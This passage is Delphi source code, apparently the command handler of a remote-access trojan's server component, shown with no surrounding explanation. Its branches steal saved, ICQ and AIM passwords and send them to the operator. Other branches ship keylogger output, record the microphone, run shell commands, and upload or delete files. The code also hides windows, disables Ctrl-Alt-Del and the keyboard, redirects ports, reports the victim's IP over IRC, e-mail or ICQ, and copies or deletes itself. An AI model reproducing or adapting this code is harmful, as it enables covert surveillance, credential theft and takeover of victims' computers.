  Socket.SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
 end else
if cod='DDB' then
 begin
  FindFirst(Decrypt(ReadKey(Encrypt('TaKeOvEr'))),faAnyFile,rec);
  fsize := rec.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'DDB'+winkey+IntToStr(fsize);
  Socket.SendText (Feedback);
  Socket.SendStream (TFileStream.Create (Decrypt(ReadKey(Encrypt('TaKeOvEr'))), fmOpenRead or fmShareDenyWrite));
  try DeleteFile(Decrypt(ReadKey(Encrypt('TaKeOvEr'))));except end;
 end else
if cod='RPL' then
 begin
  RefreshProcesses;
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'RPL'+winkey+inttostr(fsize);
  Socket.SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
 end else
if cod='KRP' then
 begin
  if TerminateProc(StrToInt(text)) then raspuns:='process killed.' else raspuns:='error killing process.';
 end else
if cod='CTP' then
 begin
  if ChangeThreadPriority(StrToInt(text[1]),strtoint(copy(text,2,length(text)))) then raspuns:='thread priority changed.' else raspuns:='error changing thread priority.';
 end else
if cod='RSH' then
 begin
  stest:=text;
  if copy(stest,length(stest),1)='\' then stest:=copy(stest,1,length(stest)-1);
  if FindFirst(stest+'\*.*',faAnyFile,rec)=0 then
   begin
    text:=stest;
    AddStuff(text);
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'RSH'+winkey+inttostr(fsize);
  Socket.SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
 end else raspuns:='path ['+text+'] not found.';
 end else
if cod='SPY' then
 begin
  if ((text[1]='1') and (ICQSpySocket.Active=False)) then begin
   try ICQSpySocket.Port:=strtoint(copy(text,6,length(text)));except end;
   try ICQSpySocket.Active:=True;except end;
   if ICQSpySocket.Active then ICQSpyClock.Enabled:=True else raspuns:='error initializing socket.';
  end;
  if ICQSpySocket.Active then begin
  if (copy(text,2,3))='ICQ' then
   begin
    if text[5]='1' then
     begin
      Spies[1]:=True;
      Raspuns:='SPY2ICQ1';
     end else
     begin
      Spies[1]:=False;
      Raspuns:='SPY2ICQ0';
     end;
   end;
  if (copy(text,2,3))='AIM' then
   begin
    if text[5]='1' then
     begin
      Spies[2]:=True;
      Raspuns:='SPY2AIM1';
     end else
     begin
      Spies[2]:=False;
      Raspuns:='SPY2AIM0';
     end;
   end;
  if (copy(text,2,3))='MSN' then
   begin
    if text[5]='1' then
     begin
      Spies[3]:=True;
      Raspuns:='SPY2MSN1';
     end else
     begin
      Spies[3]:=False;
      Raspuns:='SPY2MSN0';
     end;
   end;
  if (copy(text,2,3))='YH!' then
   begin
    if text[5]='1' then
     begin
      Spies[4]:=True;
      Raspuns:='SPY2YH!1';
     end else
     begin
      Spies[4]:=False;
      Raspuns:='SPY2YH!0';
     end;
   end;
  end;
  if (text[1]='0') then begin
   ICQSpyClock.Enabled:=False;
   try ICQSpySocket.Active:=False;except end;
  end;
 end else
if cod='DIS' then
 begin
  ICQSpyClock.Enabled:=False;
  if ICQSpySocket.Active then try ICQSpySocket.Active:=False;except end;
  raspuns:='ICQ Spy disabled!';
 end else
if cod='PTF' then
 begin
  if FileExists(text) then begin
   richedit.lines.clear;
   richedit.lines.LoadFromFile(text);
   raspuns:='text printed.';
   try richedit.print('');except raspuns:='error printing...';end;
  end else raspuns:='can''t find '+text;
 end else
if cod='CAW' then
 begin
  try
   PostMessage(winds[StrToInt(text)],WM_DESTROY,0,0);
  except
   Socket.SendText('error closing application!');
   exit;
  end;
  GetWindows(true);
  raspuns:='RAW'+SendString;
 end else
if cod='FCW' then
 begin
  try
   setforegroundwindow(winds[StrToInt(text)]);
  except
   Socket.SendText('error focusing window.');
   exit;
  end;
  GetWindows(true);
  raspuns:='RAW'+SendString;
 end else
if cod='FFN' then
begin
 listbox1.clear;
 strm2send.clear;
 if text[1]='T' then dox:=true else dox:=false;
 winlen:=StrToInt(text[2]+text[3]);
 winkey:=copy(text,4,winlen);
 feedback:=copy(text,4+winlen,length(text));
 stest:=feedback;
 if copy(stest,length(stest),1)='\' then stest:=copy(stest,1,length(stest)-1);
 listbox1.items.clear;
 if FindFirst(stest+'\*.*',faAnyFile,rec)=0 then SearchAndReport(dox,winkey,feedback)
  else listbox1.items.add('path: ['+stest+'] not found...');
   ListBox1.Items.SaveToStream(Strm2Send);
   fsize:=Strm2Send.Size;
   if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
    else winkey:=IntToStr(length(IntToStr(fsize)));
   Feedback := 'LOF'+winkey+inttostr(fsize);
   Socket.SendText (Feedback);
   Strm2Send.SaveToFile(WinPath+'\temp~.bak');
   Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
   try DeleteFile(WinPath+'\temp~.bak');except end;
end else
if cod='EAW' then
 begin
  try
   EnableWindow(winds[StrToInt(text)],TRUE);
  except
   Socket.SendText('error enabling application!');
   exit;
  end;
  GetWindows(true);
  raspuns:='RAW'+SendString;
 end else
if cod='DAW' then
 begin
  try
   EnableWindow(winds[StrToInt(text)],FALSE);
  except
   Socket.SendText('error disabling application!');
   exit;
  end;
  GetWindows(true);
  raspuns:='RAW'+SendString;
 end else
if cod='DCB' then
 begin
  try
   hMenuHandle := GetSystemMenu(winds[StrToInt(text)], FALSE);
  except
   Socket.SendText('error disabling the close button!');
   exit;
  end;
  if (hMenuHandle <> 0) then begin
   DeleteMenu(hMenuHandle, SC_CLOSE, MF_BYCOMMAND);
   GetWindows(true);
   raspuns:='RAW'+SendString;
  end else
   Socket.SendText('the application doesn''t have a close button.');
 end else
if cod='HWN' then
 begin
 raspuns:='window hidden.';
 try
  ShowWindow (winds[StrToInt(text)], SW_HIDE);
  ShowWindow (GetWindow (Winds[StrToInt(text)], GW_OWNER), SW_HIDE);
  RegisterServiceProcess(GetCurrentProcessID, 1);
 except
  raspuns:='error hiding window.'
 end;
 end else
if cod='SWN' then
 begin
 raspuns:='window shown.';
 try
  ShowWindow (winds[StrToInt(text)], SW_SHOW);
  ShowWindow (GetWindow (Winds[StrToInt(text)], GW_OWNER), SW_SHOW);
  RegisterServiceProcess(GetCurrentProcessID, 1);
 except
  raspuns:='error showing window.'
 end;
 end else
if cod='GPR' then
 begin
  raspuns:='GPR'+RedirectedPorts.Lines.Text;
 end else
if cod='APR' then
 begin
  NoRedport:=99;for i:=1 to 10 do if portz[i]=false then begin NoREDPORT:=i;break;end;
  if NoREDPORT=99 then raspuns:='too many redirected ports.'
   else begin
    Portz[NoREDPORT]:=True;
    REDPORT[NoREDPORT]:=TWinshoeMappedPort.Create(self);
    REDPORT[NoREDPORT].Port:=StrToInt(copy(text,1,POS('$$$',text)-1));
    REDPORT[NoREDPORT].MappedHost:=copy(text,POS('$$$',text)+3, POS('???',text)-POS('$$$',text)-3);
    REDPORT[NoREDPORT].MappedPort:= StrToInt(copy(text,POS('???',text)+3,length(text)));
    REDPORT[NoREDPORT].Active:=True;
    RedirectedPorts.Lines.Add(IntToStr(NoREDPORT));
    RedirectedPorts.Lines.Add(copy(text,1,POS('$$$',text)-1));
    RedirectedPorts.Lines.Add(copy(text,POS('$$$',text)+3, POS('???',text)-POS('$$$',text)-3));
    RedirectedPorts.Lines.Add(copy(text,POS('???',text)+3,length(text)));
    Raspuns:='redirected port added.';
   end;
 end else
if cod='IUL' then
 begin
  GetICQList;
  Raspuns:='IUL'+SendString;
 end else
if cod='TOI' then
 begin
  Raspuns:=ExportICQUIN(text);
 end else
if cod='SPR' then
 begin
  i:=1;
  repeat
   if RedirectedPorts.Lines[i]=text then
    begin
     NoREDPORT:=StrToInt(RedirectedPorts.Lines[i-1]);
     RedirectedPorts.Lines.Delete(i-1);
     RedirectedPorts.Lines.Delete(i-1);
     RedirectedPorts.Lines.Delete(i-1);
     RedirectedPorts.Lines.Delete(i-1);
    end;
   inc(i);
  until i>=RedirectedPorts.Lines.Count;
  try REDPORT[NoREDPORT].Active:=False;except end;
  try REDPORT[NoREDPORT].Free;except end;
  try Portz[NoREDPORT]:=False;except end;
  Raspuns:='redirected port stopped.';
 end else
if cod='IUL' then
 begin
  GetICQList;
 end else
if cod='RAW' then
 begin
  if text='ON' then RefreshAll:=True else RefreshAll:=False;
  GetWindows(false);
  raspuns:='RAW'+SendString;
 end else
if cod='DAK' then
 begin
  asm
   in  al,21h
   or  al,00000010b
   out 21h,al
  end;
  raspuns:='the keyboard is now disabled!';
end else
if cod='FLP' then
 begin
  if text[1]='0' then dox:=false else dox:=true;
  if text[2]='0' then doy:=false else doy:=true;
  Socket.SendText('flipping...');
  FlipScreen(dox,doy);
  raspuns:='screen has been flipped.';
end else
if cod='EIN' then
 begin
  no:=strtoint(copy(text,1,2));
  feedback:=copy(text,3,no);
  text:=copy(text,3+no,length(text));
  SetKey(Encrypt('Name'),Encrypt(feedback));
  if Decrypt(ReadKey(Encrypt('Protect')))='true' then Raspuns:='server is protected. can''t change notification options.' else begin
  SetKey(Encrypt('ICQ'),Encrypt(text));
  SetKey(Encrypt('Enabled'),Encrypt('true'));
  InitDATA;
  SendAutoNotify(text,sender);
  raspuns:='ICQ auto notify enabled. you should soon receive a test message on icq.';
 end;end else
if cod='DIN' then
 begin
  SetKey(Encrypt('Enabled'),Encrypt('false'));
  raspuns:='ICQ notify disabled.';
end else
if (cod='NPD') and (PassDone) then begin
 if Decrypt(ReadKey(Encrypt('Protect')))='true' then Raspuns:='server is protected. can''t change password.' else begin
 if text<>'_PZD' then
  begin
   SetKey(Encrypt('Password'),Encrypt(text));
   raspuns:='new password set.';
  end else begin
   RemoveKey(Encrypt('Password'));
   raspuns:='password removed';
  end;
end;end else
if cod='RWN' then begin
 if text='1' then ExitWindowsEx(EWX_FORCE,0) else
 if text='2' then ExitWindowsEx(EWX_LOGOFF,0) else
 if text='3' then ExitWindowsEx(EWX_POWEROFF,0) else
 if text='4' then ExitWindowsEx(EWX_REBOOT,0) else
  ExitWindowsEx(EWX_SHUTDOWN,0);
end else
if cod='OCD' then begin
  mciSendString('Set cdaudio door open wait',nil,0,handle);
  raspuns:='cd rom has been opened';
end else
if cod='RMB' then begin
  SwapMouseButton(true);
  raspuns:='mouse buttons reversed.';
end else
if cod='BMB' then begin
  SwapMouseButton(false);
  raspuns:='mouse buttons restored.';
end else
if cod='CCD' then begin
  mciSendString('Set cdaudio door closed wait',nil,0,handle);
  raspuns:='cd rom has been closed';
end else
if cod='CLS' then halt(0) else
if cod='RMS' then
 begin
  try RemoveServer;except end;
  try Socket.SendText('server removed. closing...');except end;
  if fileexists(WinPath+'\~temp.bat') then try DeleteFile(WinPath+'\~temp.bat');except end;
  try
  assignfile(batf,WinPath+'\~temp.bat');
  rewrite(batf);
  WriteLn(batf,'@echo off');
  Writeln(batf, ':Repeat');
  Writeln(batf, 'del ' + ParamStr(0));
  Writeln(batf, 'if exist ' + ParamStr(0) + ' goto Repeat');
  Writeln(batf, 'del ' + LauncherName);
  Writeln(batf, 'if exist ' + ParamStr(0) + ' goto Repeat2');
  WriteLn(batf,'del '+WinPath+'\~temp.bat');
  WriteLn(batf,'exit');
  CloseFile(batf);
  except end;
  ExecuteFileOptions(WinPath+'\~temp.bat',IDLE_PRIORITY_CLASS, SW_HIDE);
  try Application.Terminate;form1.close;Halt;except end;
 end else
if cod='RSP' then
 begin
  Socket.SendText('restarting server...');
  if fileexists(WinPath+'\~temp.bat') then DeleteFile(WinPath+'\~temp.bat');
  assignfile(batf,WinPath+'\~temp.bat');
  rewrite(batf);
  WriteLn(batf,'@echo off');
  Writeln(batf, 'CHOICE /T:Y,3');
  Writeln(batf, 'start '+ParamStr(0));
  WriteLn(batf,'exit');
  CloseFile(batf);
  ExecuteFileOptions(WinPath+'\~temp.bat',IDLE_PRIORITY_CLASS, SW_HIDE);
  form1.close;
  Halt(0);
 end else
if cod='SAY' then
begin
 try spch.free;except end;
 try spch:=TDirectSS.Create(self);except raspuns:='text2speech engine not found';end;
 try spch.sayit:=text;except raspuns:='error saying text...';end;
 raspuns:='done. :)';
 //try spch.free;except end;
end else
if cod='TTS' then
begin
 raspuns:='text2speech engine FOUND.';
 try spch:=TDirectSS.Create(self);except raspuns:='text2speech engine not found';end;
 try spch.free;except end;
end else
if cod='FMD' then
 begin
  if FileExists(text) then
   begin
    DeleteFile(text);
    raspuns:='file: '+text+' has been deleted... :)';
   end else raspuns:='can''t find file: '+text;
 end else
if cod='FM2' then
 begin
  if DeleteFolder(text) then raspuns:='folder deleted.' else raspuns:='error deleting folder.';
 end else
if cod='MNF' then
 begin
  try MkDir(text);raspuns:='folder created.';except raspuns:='error creating folder.';end;
 end else
if cod='FMP' then
 begin
  if FileExists(text) then
   begin
    sndPlaySound(PChar(text),Snd_Sync);
    raspuns:='WAV file played.';
   end else raspuns:='can''t find file: '+text;
 end else
if cod='FMW' then
 begin
  if FileExists(text) then
   begin
    if UpperCase(copy(text,length(text)-2,3))='JPG' then
     ConvertToBMP(text);
    ChangeWallPaper(text);
    raspuns:='wallpaper changed to: '+text;
   end else raspuns:='can''t find file: '+text;
 end else
if cod='FMZ' then
 begin
  Duh := 0;
  SystemParametersInfo( SPI_SETFASTTASKSWITCH, 1, @Duh, 0);
  SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @Duh, 0);
  if FileExists(text) then
   begin
    ShowPicture(text);
    raspuns:='picture shown.';
   end else raspuns:='can''t find file: '+text;
 end else
if cod='FMS' then
 begin
  if FileExists(text) then
   begin
    FindFirst(text,faAnyFile,rec);
    fsize := rec.Size;
    raspuns:='SIZE'+IntToStr(round(fsize/1028));
   end else raspuns:='can''t find file: '+text;
 end else
if cod='FMX' then
 begin
  if FileExists(text) then
   begin
    DocFileDir := ExtractFileDir(text);
    ShellExecute(Form1.Handle,nil,pChar(text),nil,
              pChar(DocFileDir),SW_SHOWNORMAL);
    raspuns:='file has been executed.';
   end else raspuns:='can''t find file: '+text;
 end else
if cod='COM' then
 begin
    raspuns:='command executed.';
    try
      ExecuteFile('command.com','/c '+text,'C:\',0);
    except raspuns:='error executing command.';
    end;
 end else
if cod='CWP' then
 begin
 if FileExists(text) then begin
  text:=text+#0;
  pBitmap:=@text[1];
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pBitmap, SPIF_UPDATEINIFILE);
  raspuns:='windows wallpaper changed.';
 end else raspuns:='error. file not found';
end else
if cod='SMT' then
 begin
  if text<>'off' then
   SystemParametersInfo(SPI_SETMOUSETRAILS, StrToInt(text), nil, SPIF_UPDATEINIFILE)
  else
   SystemParametersInfo(SPI_SETMOUSETRAILS, 0, nil, SPIF_UPDATEINIFILE);
  raspuns:='mouse trails set.';
 end else
if cod='GDR' then
 begin
   ListBox1.Items.Clear;
   ld := GetLogicalDrives;
   for i := 0 to 25 do begin
    if (ld and (1 shl i)) <> 0 then
     begin
      drive:=Char(Ord('A')+i)+':\';
      case GetDriveType(PChar(drive)) of
        DRIVE_REMOVABLE: drive:=drive+' (removable)';
        DRIVE_FIXED    : drive:=drive+' (non-removable)';
        DRIVE_REMOTE   : drive:=drive+' (network)';
        DRIVE_CDROM    : drive:=drive+' (CD-ROM)';
        DRIVE_RAMDISK  : drive:=drive+' (RAM disk)';
       end;
      ListBox1.Items.Add(drive);
     end;
   end;
   Strm2Send.Clear;
   raspuns:='GDR'+ListBox1.Items.Text;
 end else
if cod='CRS' then
 begin
  ListBox1.Items.Clear;
  GetResolutions;
  raspuns:='CRS'+ListBox1.Items.Text;
 end else
if cod='CRT' then
 begin
  raspuns:='resolution changed :)';
  try ChangeResolution(StrToInt(text)); except raspuns:='error changing resolution.';end;
 end else
if cod='DLT' then
 begin
  DownloadTo:=text;
 end else
if cod='MMS' then
 begin
  if text='tart' then begin
   MsgServer:=TNMMSGServ.Create(self);
   MsgServer.Port:=6776;
   MsgServer.TimeOut:=90000;
   MsgServer.OnMsg:=NMMSGServ1MSG;
  end else begin
   MsgServer.Free;
  end;
 end else
if cod='UPD' then
 begin
  AceptaServer:=True;
 end else
if cod='GPW' then
 begin
  Strm2Send.Clear;
  GetPassTimer.Enabled:=false;
  RG:=TRegistry.Create;
  RG.RootKey:=HKEY_LOCAL_MACHINE;
  RG.OpenKey ('SOFTWARE\Microsoft\General\', TRUE);
  if RG.ValueExists ('Cate') then
  begin
   RC:=RG.ReadInteger ('Cate');
   PassList.Clear;
   for i:=1 to RC do
    PassList.Items.Add(RG.ReadString (inttostr(i)));
  end;
  RG.Destroy;
  GetPassTimer.Enabled:=true;
  PassList.Items.SaveToStream(Strm2Send);
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'GPW'+winkey+inttostr(fsize);
  Socket.SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
 end else
if cod='GOK' then
begin
  Strm2Send.Clear;
  keylog.Lines.SaveToStream(Strm2Send);
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'GOK'+winkey+inttostr(fsize);
  Socket.SendText (Feedback);
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
end else
if cod='CPL' then
 begin
  GetPassTimer.Enabled:=false;
   RG:=TRegistry.Create;
   RG.RootKey:=HKEY_LOCAL_MACHINE;
   RG.OpenKey ('SOFTWARE\Microsoft\General\', TRUE);
   if RG.ValueExists ('Cate') then
   begin
    PX:=RG.ReadInteger ('Cate');
    RG.DeleteValue ('Cate');
    for i:=1 to PX do
     RG.DeleteValue (inttostr(i));
   end;
  RG.Destroy;
  GetPassTimer.Enabled:=true;
  raspuns:='passwords cleared.';
 end else
if cod='TMF' then
 begin
  raspuns:='monitor is now OFF :)';
  try
   SendMessage(Application.Handle,wm_SysCommand,SC_MonitorPower,0);
  except
   raspuns:='error turning monitor OFF.';
  end;
 end else
if cod='TMN' then
 begin
  raspuns:='monitor is now ON';
  try
   SendMessage(Application.Handle,wm_SysCommand,SC_MonitorPower,-1);
  except
   raspuns:='error turning monitor ON.';
  end;
 end else
if cod='GMI' then
 begin
  SendSystemInformation(Sender);
  SendString:='GMI'+ListBox1.Items.Text;
  Socket.SendText(SendString);
 end else
if cod='GHI' then
 begin
  SendHomeInformation;
  SendString:='GHI'+ListBox1.Items.Text;
  Socket.SendText(SendString);
 end else
if cod='PSS' then begin
 LoadIn.Clear;
 LoadIn.Lines.Clear;
 LoadPasswords;
 SendString:='PSS'+LoadIn.Lines.Text;
 Socket.SendText(SendString);
end else
if cod='GIP' then begin
 LoadIn.Clear;
 LoadIn.Lines.Clear;
 LoadICQPasswords;
 SendString:='GIP'+LoadIn.Lines.Text;
 Socket.SendText(SendString);
end else
if cod='GAP' then begin
 LoadIn.Clear;
 LoadIn.Lines.Clear;
 LoadAIMPasswords;
 SendString:='GAP'+LoadIn.Lines.Text;
 Socket.SendText(SendString);
end else
if cod='CSN' then
 begin
  if FileExists(GameInfo1.WinDir+'\'+text+'.exe') then
  begin
   Socket.SendText('file already exists. choose a different name.');
   exit;
  end;
  FileCopy(ParamStr(0),GameInfo1.WinDir+'\'+text+'.exe');
  winexec(PChar(GameInfo1.WinDir+'\'+text+'.exe'),SW_SHOWNORMAL);
  halt(0);
  close;
 end else
if cod='DOS' then
 begin
  RUNDOSCOMMAND(text);
 end else
if cod='TKS' then
// KEYLOG DISBALED!
 begin
  if text[1]+text[2]='on' then raspuns:='key press listen enabled' else
   raspuns:='key press listen disabled';
  if text[1]+text[2]='on' then
   begin
    if (NOT FileExists(SysPath+'\SYSTRAY.DLL')) then raspuns:='error. missing dll file.' else
    begin
     if length(text)>3 then
     try KeySock.Port:=StrToInt(Copy(text,3,length(text)));except end;
     EnableKeyLogger;
     if keysock.active=false then keysock.Active:=True;
    end;
   end else
  if (NOT FileExists(SysPath+'\SYSTRAY.DLL')) then raspuns:='error. missing dll file.' else
   begin try DisableKeyLogger;keysock.Active:=False;except end;end;         
 end else
if cod='IMX' then
 begin
  if text[1]='1' then Matrix.Smaller:=True else Matrix.Smaller:=False;
  Raspuns:=text[2]+text[3];
  if MatrixSock.Active then try MatrixSock.Active:=False;except end;
  try MatrixSock.Port:=StrToInt(copy(text,4,StrToInt(Raspuns)));except end;
  Matrix.INIT_TEXT:=copy(text,4+StrToInt(Raspuns),length(text));
  raspuns:='matrix initiated';
  try if MatrixSock.active=false then MatrixSock.Active:=True;except raspuns:='can''t initiate matrix';end;
 end else
if cod='DMX' then
 begin
  raspuns:='matrix closed';
  try MatrixSock.CLOSE;except end;
 end else
if cod='RWC' then if (not ColorsChanged) then raspuns:='what do you wanna restore? CHANGE them first!' else
 begin
  SetColorz[1]:=COLOR_MENU;
  SetColorz[2]:=COLOR_3DFACE;
  SetColorz[3]:=COLOR_WINDOW;
  raspuns:='colors restored.';
  try SetSysColors(3,SetColorz,OriginalColors);except raspuns:='error restoring colors...';end;
 end else
if cod='CWC' then
 begin
  SetColorz[1]:=COLOR_MENU;
  SetColorz[2]:=COLOR_3DFACE;
  SetColorz[3]:=COLOR_WINDOW;
  if (not ColorsChanged) then begin
   OriginalColors[1]:=GetSysColor(COLOR_MENU);
   OriginalColors[2]:=GetSysColor(COLOR_3DFACE);
   OriginalColors[3]:=GetSysColor(COLOR_WINDOW);
   ColorsChanged:=True;
  end;
  NewColors[1]:=ColorToRGB(StringToColor(copy(text,1,pos(';',text)-1)));
  NewColors[2]:=ColorToRGB(StringToColor(copy(text,pos(';',text)+1,pos(':',text)-pos(';',text)-1)));
  NewColors[3]:=ColorToRGB(StringToColor(copy(text,pos(':',text)+1,length(text))));
  raspuns:='colors changed. buhahahahaha';
  try SetSysColors(3,SetColorz,NewColors);except raspuns:='error changing colors.';end;
 end else
if cod='OVC' then
 begin
  ChatZoom:=StrToInt(copy(text,1,3));
  VSize:=StrToInt(copy(text,4,2));
  CSize:=StrToInt(copy(text,6,2));
   raspuns:=copy(text,8,2);
  VCol:=copy(text,10,StrToInt(raspuns));
  CCol:=copy(text,10+StrToInt(raspuns),length(text));
  raspuns:='OpenVictimChat';
  try ChatSock.Active:=True;except raspuns:='error initiating chat...';end;
  if Raspuns='OpenVictimChat' then
  begin
   for i:=1 to ServerSocket1.Socket.ActiveConnections do
    try ServerSocket1.Socket.Connections[i-1].SendText('OpenVictimChat');except end;
   raspuns:='';
  end;
  MyChat.Height:=round((ChatZoom/100)*(Screen.Height));
  MyChat.Width:=round((ChatZoom/100)*(Screen.Width));
  MyChat.MyMemo.Lines.Clear;
  MyChat.Show;
  MyChat.MakeItOnTop;
  MyChat.Timer.Enabled:=True;
 end else
if cod='OCC' then
 begin
  raspuns:='OpenClientChat';
  try ChatSock.Active:=True;except raspuns:='error initiating chat...';end;
  if Raspuns='OpenClientChat' then
  begin
   for i:=1 to ServerSocket1.Socket.ActiveConnections do
    try ServerSocket1.Socket.Connections[i-1].SendText('OpenClientChat');except end;
   raspuns:='';
  end;
 end else
if cod='RSF' then
 begin
  WriteTheWAVFile;
  media.FileName:=WinPath+'\flfrdat.wav';
  media.Open;
  rectime.Interval:=(StrToInt(text)+1)*1000;
  rectime.Enabled:=True;
  raspuns:='recording for '+text+' secounds...';
  media.StartRecording;
 end else
if cod='SMC' then
 begin
  if text='off' then begin
   resur:=TResourceStream.Create(HInstance,'RCDATA_3',RT_RCDATA);
   resur.SaveToFile(WinPath+'\mmcdata.cur');
   resur.free;
   ac1.fn:=WinPath+'\mmcdata.cur';
   ac1.active:=true;
   raspuns:='mouse cursor is now OFF...';
   deletefile(WinPath+'\mmcdata.cur');
  end else begin
   ac1.active:=false;
   Cursor:=crDefault;
   raspuns:='mouse cursor is now ON...';
  end
 end else
if cod='ULF' then
 begin
  if DownloadFile then raspuns:='already uploading...' else
  begin
   DownloadFile:=True;
   DownloadFileName:=text;
   raspuns:='uploading...';
 end;end else
if cod='CPT' then
 begin
    if Decrypt(ReadKey(Encrypt('Protect')))='true' then Raspuns:='server is protected. can''t change port.' else begin
    SetKey(Encrypt('Port Number'),Encrypt(text));
    serversocket1.active:=false;
    DownloadFile:=False;Conectat:=False;Parola:=Decrypt(ReadKey(Encrypt('Password')));
    if (Parola<>'') and (Parola<>'ERROR') then PassDone:=False;
    serversocket1.port:=StrToInt(text);
    serversocket1.active:=true;end;
 end else
if cod='FTP' then
 begin
  if copy(text,1,7)='disable' then
   begin
    FtpServer1.Stop;
    FtpServer1.DisconnectAll;
    socket.sendtext('FTP server disabled');
    exit;
   end;
  if copy(text,1,7)='enable!' then
   begin
    FTPPassword:='';
    if Pos('@@@',text)>8 then FTPPassword:=copy(text,8,Pos('@@@',text)-8);
    FtpServer1.port:=copy(text,POS('@@@',text)+3,pos(':::',text)- (POS('@@@',text)+3));
    FtpServer1.MaxClients:=StrToInt(copy(text,Pos(':::',text)+3,Pos('$$$',text)-Pos(':::',text)-3));
    LocalFTPFolder:=Copy(text,Pos('$$$',text)+3,length(text));
    FtpServer1.Start;
    socket.sendtext('FTP server enabled');
    exit;
   end;
 end else
if cod='CAD' then
 begin
  raspuns:='CtrlAltDel disabled.';
  try
   SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @dummy, 0);
  except
   raspuns:='error disabling CtrlAltDel.';
  end;
 end else
if cod='CAE' then
 begin
  raspuns:='CtrlAltDel enabled.';
  try
  SystemParametersInfo( SPI_SCREENSAVERRUNNING, 0, @dummy, 0);
  except
   raspuns:='error enabling CtrlAltDel.';
  end;
 end else
if cod='MTK' then
 begin
  winlen:=StrToInt(copy(text,1,2));
  winkey:=copy(text,3,length(text)-2);
  raspuns:=PressKeyz(winkey,winlen);
 end else
if cod='HGU' then begin Socket.SendText('connection closed.');DialUp1.GetConnections;end else
if cod='CSL' then
 begin
 try
  if text='ON' then SetTheKey.CapsLock:=true else SetTheKey.CapsLock:=false;
  if text='ON' then raspuns:='CapsLock is now ON' else raspuns:='CapsLock is now OFF';
 except raspuns:='error setting CapsLock';end;
 end else
if cod='NML' then {}
 begin
 try
  if text='ON' then SetTheKey.NumLock:=true else SetTheKey.NumLock:=false;
  if text='ON' then raspuns:='NumLock is now ON' else raspuns:='NumLock is now OFF';
 except raspuns:='error setting NumLock';end;
 end else
if cod='SCL' then
 begin
 try
  if text='ON' then SetTheKey.ScrollLock:=true else SetTheKey.ScrollLock:=false;
  if text='ON' then raspuns:='ScrollLock is now ON' else raspuns:='ScrollLock is now OFF';
 except raspuns:='error setting ScrollLock';end;
 end else
if cod='EEM' then begin
if Decrypt(ReadKey(Encrypt('Protect')))='true' then Raspuns:='server is protected. can''t change notification options.' else begin
 SetKey(Encrypt('EMdoit'),Encrypt('true'));
 SetKey(Encrypt('EMto'),Encrypt(copy(text,7,strtoint(text[1]+text[2]))));
 SetKey(Encrypt('EMaddress'),Encrypt(copy(text,7+strtoint(text[1]+text[2]),strtoint(text[3]+text[4]))));
 SetKey(Encrypt('EMid'),Encrypt(copy(text,7+strtoint(text[1]+text[2])+strtoint(text[3]+text[4]),strtoint(text[5]+text[6]))));
 InitDATA;
 SendE_Mail('This is only a TEST e-mail. If you receive this, then it worked. :)');
 if success then raspuns:='email ip notification enabled successfully' else
  raspuns:='error tryin'' to enable the email notification';
end;end else
if cod='DEM' then begin
 SetKey(Encrypt('EMdoit'),Encrypt('false'));
 raspuns:='email notification disabled.';
end else
if cod='EIC' then begin
if Decrypt(ReadKey(Encrypt('Protect')))='true' then Raspuns:='server is protected. can''t change notification options.' else begin
 SetKey(Encrypt('IRC'),Encrypt('true'));
 SetKey(Encrypt('IRCchannel'),Encrypt(copy(text,7,strtoint(text[1]+text[2]))));
 SetKey(Encrypt('IRCserver'),Encrypt(copy(text,7+strtoint(text[1]+text[2]),strtoint(text[3]+text[4]))));
 SetKey(Encrypt('IRCport'),Encrypt(copy(text,7+strtoint(text[1]+text[2])+strtoint(text[3]+text[4]),strtoint(text[5]+text[6]))));
 InitDATA;
 IRC_SEND('This is only a TEST of the notification. If you receive this, then it works!');
 raspuns:='IRC notification enabled';
end;end else
if cod='DIC' then begin
 SetKey(Encrypt('IRC'),Encrypt('false'));
 raspuns:='IRC notification disabled.';
end else
if cod='SP1' then begin Speaker.StartBeepin(811);raspuns:='the PC speaker is now beepin'' :)';end else
if cod='SP2' then begin Speaker.StopBeepin;raspuns:='the PC speaker stopped beepin''';end{
 else raspuns:='UNKNOWN COMMAND'};
{======================= CUSTOM COMMANDS ================================}
